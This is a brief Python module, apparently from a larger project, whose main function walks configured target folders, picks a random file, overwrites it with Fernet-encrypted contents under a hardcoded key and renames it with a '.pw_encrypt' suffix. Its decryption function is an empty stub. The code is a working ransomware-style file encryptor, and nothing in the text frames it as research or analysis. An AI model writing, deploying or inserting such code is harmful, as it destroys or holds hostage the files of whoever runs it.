from . import config
from cryptography.fernet import Fernet
from pathlib import Path
import random

_encryption_key = b"WkgJfErD7J_LqwX_hmAiFZfmVLOt1p7ZXpaCl0vdZgY=" # placeholder
_fernet = Fernet(_encryption_key)

def encrypt_random_file():
	"""Encrypt a random file in the target folders and return the path encrypted."""
	target_folders = config.get_target_folders()
	target_files = []
	for folder in target_folders:
		folder_path = Path(folder)
		if folder_path.is_dir():
			for file_path in folder_path.rglob("*"):
				if not file_path.is_dir() and file_path.suffix != ".pw_encrypt":
					target_files.append(folder_path.joinpath(file_path))
	if target_files:
		file_path = random.choice(target_files)
		file_bytes = file_path.read_bytes()
		encrypted = _fernet.encrypt(file_bytes)
		file_path.write_bytes(encrypted)
		file_path.replace(file_path.with_suffix(file_path.suffix+".pw_encrypt"))
		return str(file_path)
	else:
		raise RuntimeError("No files found to encrypt")

def decrypt_file(path):
	pass
